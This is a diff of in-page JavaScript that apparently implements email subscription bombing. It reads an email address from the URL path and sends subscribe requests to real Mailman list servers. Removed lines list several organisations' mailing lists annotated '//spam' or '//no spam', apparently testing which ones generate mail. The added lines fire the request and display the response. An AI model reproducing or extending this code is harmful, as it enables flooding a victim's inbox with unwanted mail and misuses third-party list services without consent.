@@ -18,15 +18,21 @@ idattack = makeid(30)
     path = arr[arr.length - 1];
     let start = document.getElementById("start");
     start.textContent = '{"status":"success"}'
+    
+    var url = "http://coral.aoml.noaa.gov/mailman/subscribe/coral-list?email="+path;
 
-/*var dataString4 = "email="+patch;
-$.ajax({type: "POST", url: "http://coral.aoml.noaa.gov/mailman/subscribe/cdhc", data: dataString4, cache: false,}) //no spam
+alert(url)
 
-$.ajax({type: "POST", url: "http://coral.aoml.noaa.gov/mailman/subscribe/coral-list", data: dataString4, cache: false,}) //spam
+var xhr = new XMLHttpRequest();
+xhr.open("GET", url);
 
-$.ajax({type: "POST", url: "https://starj.com/mailman/subscribe/headlines_starj.com", data: dataString4, cache: false,}) //spam
+xhr.setRequestHeader("Accept", "application/json");
 
-$.ajax({type: "POST", url: "http://lists.vmware.com/mailman/subscribe/security-announce", data: dataString4, cache: false,}) //no spam
+xhr.onreadystatechange = function () {
+   if (xhr.readyState === 4) {
+      alert(xhr.status);
+      alert(xhr.responseText);
+   }};
 
-$.ajax({type: "POST", url: "https://lists.drupal.org/mailman/subscribe/security-internals", data: dataString4, cache: false,}) //???
+xhr.send();
 </script>
